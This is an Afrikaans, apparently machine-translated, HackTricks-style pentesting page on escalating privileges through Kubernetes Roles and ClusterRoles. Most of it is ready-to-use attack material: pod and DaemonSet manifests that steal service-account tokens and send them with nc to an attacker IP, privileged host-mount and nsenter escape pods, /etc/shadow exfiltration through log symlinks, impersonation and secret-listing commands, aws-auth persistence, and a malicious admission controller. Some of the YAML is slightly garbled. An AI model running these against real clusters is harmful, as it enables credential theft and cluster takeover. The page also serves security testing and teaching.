# Misbruik van Rolle/ClusterRoles in Kubernetes

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

Hier kan jy potensieel gevaarlike Rolle en ClusterRoles-konfigurasies vind.\
Onthou dat jy al die ondersteunde bronne kan kry met `kubectl api-resources`

## **Bevoorregte Eskalasie**

Verwys na die kuns om **toegang tot 'n ander beginsel** binne die cluster te kry **met verskillende voorregte** (binne die kubernetes cluster of na eksterne clouds) as diegene wat jy reeds het, in Kubernetes is daar basies **4 hoof tegnieke om voorregte te eskaleer**:

* In staat wees om ander gebruiker/groepe/SAs te **impersoneer** met beter voorregte binne die kubernetes cluster of na eksterne clouds
* In staat wees om **pods te skep/patch/exec** waar jy **SAs kan vind of koppel** met beter voorregte binne die kubernetes cluster of na eksterne clouds
* In staat wees om **geheime sleutels te lees** aangesien die SAs se tokens as geheime sleutels gestoor word
* In staat wees om **te ontsnap na die node** vanaf 'n houer, waar jy al die geheime sleutels van die houers wat op die node loop, die geloofsbriewe van die node, en die toestemmings van die node binne die wolk waarin dit hardloop (indien enige) kan steel
* 'n Vyfde tegniek wat 'n vermelding verdien, is die vermo√´ om **port-forward** in 'n houer uit te voer, aangesien jy dalk toegang kan kry tot interessante bronne binne daardie houer.

### Toegang tot Enige Bron of Werkwoord (Wildcard)

Die **wildcard (\*) gee toestemming oor enige bron met enige werkwoord**. Dit word deur admins gebruik. Binne 'n ClusterRole beteken dit dat 'n aanvaller enige naamspasie in die cluster kan misbruik.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Toegang tot enige hulpbron met 'n spesifieke werkwoord

In RBAC stel sekere toestemmings aansienlike risiko's:

1. **`create`:** Gee die vermo√´ om enige klasteroptie te skep, wat die risiko van voorreg-escalasie inhou.
2. **`list`:** Maak dit moontlik om alle hulpbronne te lys, moontlik om sensitiewe data uit te lek.
3. **`get`:** Maak dit moontlik om geheime van diensrekeninge te benader, wat 'n sekuriteitsrisiko inhou.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Skep - Steel Token

'n Aanvaller met die regte om 'n pod te skep, kan 'n bevoorregte Diensrekening aan die pod heg en die token steel om die Diensrekening te impersoneer. Dit verhoog effektief die voorregte daaraan

Voorbeeld van 'n pod wat die token van die `bootstrap-signer` diensrekening sal steel en dit aan die aanvaller stuur:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Skep & Ontsnapping

Die volgende dui al die voorregte aan wat 'n houer kan h√™:

* **Bevoorregte toegang** (deaktivering van beskerming en instelling van vermo√´ns)
* **Deaktiveer namespaces hostIPC en hostPid** wat kan help om voorregte te eskaleer
* **Deaktiveer hostNetwork** namespace, wat toegang gee om wolkvoorregte te steel en beter toegang tot netwerke te verkry
* **Monteer gasheer / binne die houer**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Skep die pod met:
```bash
kubectl --token $token create -f mount_root.yaml
```
Een-liner van [hierdie tweet](https://twitter.com/mauilion/status/1129468485480751104) en met 'n paar byvoegings:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Nou dat jy kan ontsnap na die node, kontroleer post-exploitation tegnieke in:

#### Steels

Jy wil waarskynlik **stealthier** wees, op die volgende bladsye kan jy sien wat jy sou kon toegang as jy 'n pod skep wat slegs sommige van die genoemde voorregte in die vorige sjabloon aktiveer:

* **Bevoorreg + hostPID**
* **Slegs bevoorreg**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Jy kan voorbeelde vind van hoe om die vorige bevoorregte pod-konfigurasies te skep/misbruik in_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Skep - Beweeg na die wolk

As jy 'n **pod kan skep** (en opsioneel 'n **diensrekening**) kan jy moontlik **voorregte in die wolkomgewing verkry** deur **wolkrolle aan 'n pod of 'n diensrekening toe te ken** en dit dan te benader.\
Verder, as jy 'n **pod met die gasheer-netwerknaamspasie kan skep**, kan jy die **IAM-rol** van die **node**-instansie **steel**.

Vir meer inligting, kyk:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Skep/Patch Implementering, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Werk en Cronjobs**

Dit is moontlik om hierdie toestemmings te **misbruik om 'n nuwe pod te skep** en voorregte soos in die vorige voorbeeld te **vestig**.

Die volgende yaml **skep 'n daemonset en eksfiltreer die token van die SA** binne die pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Uitvoer**

**`pods/exec`** is 'n hulpbron in kubernetes wat gebruik word vir **die uitvoer van bevele in 'n skaal binne 'n houer**. Dit maak dit moontlik om **bevele binne die houers uit te voer of 'n skaal binne te gaan**.

Daarom is dit moontlik om **binne 'n houer in te gaan en die token van die SA te steel**, of om 'n bevoorregte houer binne te gaan, na die node te ontsnap, en al die tokens van die houers in die node te steel en die node te (mis)bruik:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Hierdie toestemming maak dit moontlik om **een plaaslike poort na een poort in die gespesifiseerde peul te stuur**. Dit is bedoel om dit maklik te maak om programme wat binne 'n peul hardloop te ontleed, maar 'n aanvaller kan dit misbruik om toegang te verkry tot interessante (soos DBs) of kwesbare programme (web?) binne 'n peul:
```
kubectl port-forward pod/mypod 5000:5000
```
### Gasheerders Skryfbaar /var/log/ Ontsnapping

Soos [**aangedui in hierdie navorsing**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), as jy toegang kan kry tot of 'n houer kan skep met die **gasheerders `/var/log/` gids daaraan geheg**, kan jy **ontsnap uit die houer**.\
Dit is basies omdat wanneer die **Kube-API probeer om die logboeke** van 'n houer te kry (deur `kubectl logs <pod>` te gebruik), dit die `0.log` l√™er van die houer aanvra as deel van die `/logs/` eindpunt van die **Kubelet** diens.\
Die Kubelet-diens stel die `/logs/` eindpunt bloot wat basies net die `/var/log` l√™ersisteem van die houer blootstel.

Dus, 'n aanvaller met **toegang om in die /var/log/ gids te skryf** van die houer kan hierdie gedrag op 2 maniere misbruik:

* Die `0.log` l√™er van sy houer wysig (gewoonlik gele√´ in `/var/logs/pods/namespace_pod_uid/container/0.log`) om 'n **symboliese skakel te wees wat na `/etc/shadow` wys** byvoorbeeld. Dan sal jy in staat wees om gasheerders skadul√™er te eksfiltreer deur:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Indien die aanvaller enige hoof met die regte om `nodes/log` te lees beheer, kan hy net 'n **symboliese skakel** in `/host-mounted/var/log/sym` na `/` skep en wanneer hy **toegang tot `https://<gateway>:10250/logs/sym/` kry, sal hy die gasheer se hoof** l√™ersisteem lys (die skakel verander kan toegang tot l√™ers bied).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**'n Laboratorium en geoutomatiseerde uitbuiting kan gevind word in** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Oorskryding van readOnly beskerming <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

As jy gelukkig genoeg is en die hoogs bevoorregte vermo√´ `CAP_SYS_ADMIN` beskikbaar is, kan jy net die vouer hermonteer as rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Oorweging van hostPath readOnly beskerming <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Soos aangedui in [**hierdie navorsing**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) is dit moontlik om die beskerming te omseil:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Wat bedoel was om ontsnappings soos die voriges te voorkom deur in plaas daarvan 'n hostPath-montasie te gebruik, is om 'n PersistentVolume en 'n PersistentVolumeClaim te gebruik om 'n gasheer se vouer in die houer te monteer met skryftoegang:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonating bevoorregte rekeninge**

Met 'n [**gebruiker simulasie**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) voorreg, kan 'n aanvaller 'n bevoorregte rekening simuleer.

Gebruik net die parameter `--as=<gebruikersnaam>` in die `kubectl` bevel om 'n gebruiker te simuleer, of `--as-group=<groep>` om 'n groep te simuleer:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Of gebruik die REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Lys van Geheime

Die toestemming om **geheime te lys kan 'n aanvaller toelaat om werklik die geheime te lees** deur die REST API-eindpunt te benader:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Die lees van 'n geheim - bruto-kragtige token-ID's

Terwyl 'n aanvaller in besit van 'n token met leesregte die presiese naam van die geheim benodig om dit te gebruik, in teenstelling met die wyer _**lys geheime**_ voorreg, is daar steeds kwesbaarhede. Standaarddiensrekeninge in die stelsel kan ge√´numereer word, elkeen geassosieer met 'n geheim. Hierdie geheime het 'n naamstruktuur: 'n statiese voorvoegsel gevolg deur 'n lukrake vyfkarakter alfanumeriese token (uitgesonderde sekere karakters) volgens die [bronkode](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Die token word gegenereer uit 'n beperkte 27-karakterset (`bcdfghjklmnpqrstvwxz2456789`), eerder as die volledige alfanumeriese reeks. Hierdie beperking verminder die totale moontlike kombinasies tot 14,348,907 (27^5). Gevolglik kan 'n aanvaller moontlik 'n bruto-kragtaanval uitvoer om die token in 'n paar uur af te lei, wat moontlik kan lei tot voorreg-escalasie deur toegang tot sensitiewe diensrekeninge.

### Sertifikaatondertekeningsversoeke

As jy die werkwoorde **`skep`** het in die hulpbron `certificatesigningrequests` (of ten minste in `certificatesigningrequests/nodeClient`). Jy kan 'n nuwe CeSR van 'n **nuwe node** **skep**.

Volgens die [dokumentasie is dit moontlik om hierdie versoeke outomaties goed te keur](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), so in daardie geval het jy **nie ekstra regte nodig nie**. Indien nie, sou jy die versoek moet goedkeur, wat 'n opdatering in `certificatesigningrequests/approval` en `approve` in `signers` met hulpbronnaam `<signerNameDomain>/<signerNamePath>` of `<signerNameDomain>/*` beteken.

'n **Voorbeeld van 'n rol** met al die benodigde regte is:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
So, met die nuwe node CSR goedgekeur, kan jy die spesiale regte van nodes **misbruik** om **geheime te steel** en **voorregte te eskaleer**.

In [**hierdie pos**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) en [**hierdie een**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) is die GKE K8s TLS Bootstrap-konfigurasie ingestel met **outomatiese ondertekening** en dit word misbruik om geloofsbriewe van 'n nuwe K8s Node te genereer en dit dan te misbruik om voorregte te eskaleer deur geheime te steel.\
As jy **die genoemde voorregte het, kan jy dieselfde ding doen**. Let daarop dat die eerste voorbeeld die fout omseil wat voorkom dat 'n nuwe node toegang tot geheime binne houers het omdat 'n **node slegs die geheime van houers wat daarop gemonteer is, kan benader.**

Die manier om dit te omseil is om net 'n node-geloofsbriewe vir die nodenaam waar die houer met die interessante geheime gemonteer is, te **skep** (maar kyk net hoe om dit in die eerste pos te doen):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth konfigmaps

Prinsipale wat **`configmaps`** in die kube-stelsel naamspasie op EKS kan wysig (moet in AWS wees) kan klastervervalbevoegdhede verkry deur die **aws-auth**-konfigmap te oorskryf.\
Die werkwoorde wat nodig is, is **`update`** en **`patch`**, of **`create`** as die configmap nie geskep is nie:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Jy kan **`aws-auth`** gebruik vir **volharding** om toegang te gee aan gebruikers van **ander rekeninge**.

Maar, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **werk nie vanaf 'n ander rekening** nie. Maar eintlik werk `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` as jy die ARN van die cluster plaas in plaas van net die naam.\
Om `kubectl` te laat werk, maak seker om die **slagoffers kubeconfig te konfigureer** en in die aws exec-args voeg `--profile other_account_role` by sodat kubectl die ander rekeningprofiel gebruik om die token te kry en kontak te maak met AWS.
{% endhint %}

### Eskalering in GKE

Daar is **2 maniere om K8s-toestemmings aan GCP-prinsipale toe te ken**. In enige geval benodig die prinsipaal ook die toestemming **`container.clusters.get`** om geloofsbriewe te kan versamel om toegang tot die cluster te verkry, of jy sal jou eie kubectl-konfigurasie l√™er moet **genereer** (volg die volgende skakel).

{% hint style="warning" %}
Wanneer daar met die K8s-api-eindpunt gepraat word, sal die **GCP-geloofsbriewe gestuur word**. Dan sal GCP, deur die K8s-api-eindpunt, eers **nagaan of die prinsipaal** (per e-pos) **enige toegang binne die cluster het**, daarna sal dit nagaan of dit enige toegang via GCP IAM het.\
Indien **enige** van daardie waar is, sal hy **reageer**. Indien **nie** 'n **fout** wat voorstel om **toestemmings via GCP IAM te gee** sal gegee word.
{% endhint %}

Dan is die eerste metode om **GCP IAM** te gebruik, die K8s-toestemmings het hul **ekwivalente GCP IAM-toestemmings**, en as die prinsipaal dit het, sal hy dit kan gebruik.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Die tweede metode is om **K8s-toestemmings binne die cluster toe te ken** aan die identifisering van die gebruiker deur sy **e-pos** (GCP-diensrekeninge ingesluit).

### Skep diensrekeninge-token

Prinsipale wat **TokenRequests kan skep** (`serviceaccounts/token`) Wanneer daar met die K8s-api-eindpunt gepraat word, kan SAs (inligting van [**hier**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Prinsipale wat **`update`** of **`patch`** **`pods/ephemeralcontainers`** kan uitvoer **kodes op ander peule**, en moontlik **ontsnap** na hul node deur 'n ephemeral houer met 'n bevoorregte securityContext by te voeg.

### ValidatingWebhookConfigurations of MutatingWebhookConfigurations

Prinsipale met enige van die werkwoorde `create`, `update` of `patch` oor `validatingwebhookconfigurations` of `mutatingwebhookconfigurations` kan dalk in staat wees om **een van sulke webhookkonfigurasies te skep** om sodoende **toestemmings te eskaleer**.

Vir 'n voorbeeld van [`mutatingwebhookconfigurations` sien hierdie afdeling van hierdie pos](./#malicious-admission-controller).

### Eskaleer

Soos wat jy kan lees in die volgende afdeling: [**Ingeboude Bevoorregte Eskalasie Voorkoming**](./#built-in-privileged-escalation-prevention), kan 'n prinsipaal nie rolle of clusterroles opdateer of skep sonder om self daardie nuwe toestemmings te h√™ nie. Behalwe as hy die **werkwoord `escalate`** oor **`roles`** of **`clusterroles`** het.\
Dan kan hy nuwe rolle skep/opdateer met beter toestemmings as die een wat hy het.

### Nodes proxy

Prinsipale met toegang tot die **`nodes/proxy`** subbron kan **kode op peule uitvoer** via die Kubelet API (volgens [**hierdie**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Meer inligting oor Kubelet-outentifisering op hierdie bladsy:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Jy het 'n voorbeeld van hoe om [**RCE te kry deur geoutoriseerd te praat met 'n Kubelet API hier**](../pentesting-kubernetes-services/#kubelet-rce).

### Verwyder peule + onskeduleerbare nodes

Prinsipale wat **peule kan verwyder** (`delete` werkwoord oor `pods` bron), of **peule kan verdryf** (`create` werkwoord oor `pods/eviction` bron), of **peulstatus kan verander** (toegang tot `pods/status`) en kan **ander nodes onskeduleerbaar maak** (toegang tot `nodes/status`) of **nodes kan verwyder** (`delete` werkwoord oor `nodes` bron) en beheer het oor 'n peul, kan **peule van ander nodes steel** sodat hulle **uitgevoer** word in die **gekompromitteerde node** en die aanvaller kan die tokens **steel** van daardie peule.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Diensstatusse (CVE-2020-8554)

Prinsipale wat **`diens/status`** kan **verander**, kan die veld `status.loadBalancer.ingress.ip` instel om die **ongepatchte CVE-2020-8554** uit te buit en **MiTM-aanvalle teen die klas**ter te lanceer. Die meeste mitigasies vir CVE-2020-8554 voorkom slegs ExternalIP-diensse (volgens [**hierdie**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Nodes en Pods status

Prinsipale met **`update`** of **`patch`** toestemmings oor `nodes/status` of `pods/status`, kan etikette verander om skeduleringsbeperkings af te dwing.

## Ingeboude Voorregverhogingsvoorkoming

Kubernetes het 'n [ingeboude meganisme](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) om voorregverhoging te voorkom.

Hierdie stelsel verseker dat **gebruikers nie hul voorregte kan verhoog deur rolle of rolbindings te verander nie**. Die afdwinging van hierdie re√´l vind plaas op API-vlak, wat 'n beskerming bied selfs wanneer die RBAC-autoriseerder onaktief is.

Die re√´l bepaal dat 'n **gebruiker slegs 'n rol kan skep of opdateer as hulle al die toestemmings besit wat die rol behels**. Verder moet die omvang van die gebruiker se bestaande toestemmings ooreenstem met di√© van die rol wat hulle probeer skep of verander: √≥f klasbreed vir ClusterRoles of beperk tot dieselfde naamspasie (of klasbreed) vir Roles.

{% hint style="warning" %}
Daar is 'n uitsondering op die vorige re√´l. As 'n hoof het die **werkwoord `escalate`** oor **`roles`** of **`clusterroles`** kan hy die voorregte van rolle en clusterroles verhoog selfs sonder om die toestemmings self te h√™.
{% endhint %}

### **Kry & Verander RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Na alle waarskynlikheid het hierdie tegniek vantevore gewerk, maar volgens my toetse werk dit nie meer om dieselfde rede wat in die vorige afdeling verduidelik is nie. Jy kan nie 'n rolbinding skep/verander om jouself of 'n ander SA sekere voorregte te gee as jy dit nie reeds het nie.**
{% endhint %}

Die voorreg om Rolebindings te skep, laat 'n gebruiker toe om **rolle aan 'n diensrekening te bind**. Hierdie voorreg kan moontlik tot voorregverhoging lei omdat dit die gebruiker **toelaat om admin-voorregte aan 'n gekompromitteerde diensrekening te bind.**

## Ander Aanvalle

### Sidecar proxy-toep

Standaard is daar geen enkripsie in die kommunikasie tussen pods nie. Wederkerige outentifikasie, tweerigting, pod tot pod.

#### Skep 'n sidecar proxy-toep <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Skep jou .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Wysig jou .yaml en voeg die uitkommentarieerde lyne by:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Sien die logboeke van die proxy:
```bash
kubectl logs app -C proxy
```
More inligting by: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Skadelike Toelatingsbeheerder

'n Toelatingsbeheerder **onderskep versoek aan die Kubernetes API-bediener** voordat die objek volhard word, maar **nadat die versoek ge√Ødentifiseer** **en gemagtig** is.

As 'n aanvaller op een of ander manier daarin slaag om 'n Mutatie Toelatingsbeheerder in te spuit, sal hy in staat wees om **reeds ge√Ødentifiseerde versoek te wysig**. Dit kan potensieel privesc, en meer gewoonlik volhard in die cluster.

**Voorbeeld van** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Kyk na die status om te sien of dit gereed is:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Bespreek dan 'n nuwe houer:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Wanneer jy die `ErrImagePull`-fout sien, kontroleer die beeldnaam met enige van die navrae:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Soos u kan sien in die boafbelding, het ons probeer om die beeld `nginx` uit te voer, maar die finale uitgevoerde beeld is `rewanthtammana/malicious-image`. Wat het net gebeur!!?

#### Tegniese Besonderhede <a href="#heading-technicalities" id="heading-technicalities"></a>

Die `./deploy.sh` skrips stel 'n muterende webhook-toelatingsbeheerder op, wat versoek aan die Kubernetes API wysig soos gespesifiseer in sy konfigurasie re√´ls, wat die waargenome uitkomste be√Ønvloed:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Die bogenoemde uittreksel vervang die eerste houerbeeld in elke peul met `rewanthtammana/malicious-image`.

## OPA Gatekeeper omseiling

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Beste Praktyke

### **Deaktivering van outomatiese berging van Diensrekeningtokens**

* **Peule en Diensrekeninge**: Standaard berg peule 'n diensrekeningtoken. Om sekuriteit te verbeter, maak dit moontlik om hierdie outomatiese bergingsfunksie te deaktiveer.
* **Hoe om toe te pas**: Stel `automountServiceAccountToken: false` in die konfigurasie van diensrekeninge of peule vanaf Kubernetes weergawe 1.6.

### **Beperkende Gebruikerstoewysing in RoleBindings/ClusterRoleBindings**

* **Selektiewe Insluiting**: Verseker dat slegs nodige gebruikers ingesluit word in RoleBindings of ClusterRoleBindings. Auditeer gereeld en verwyder onvanpaslike gebruikers om streng sekuriteit te handhaaf.

### **Naamspesifieke Rolle oor Klastergewyse Rolle**

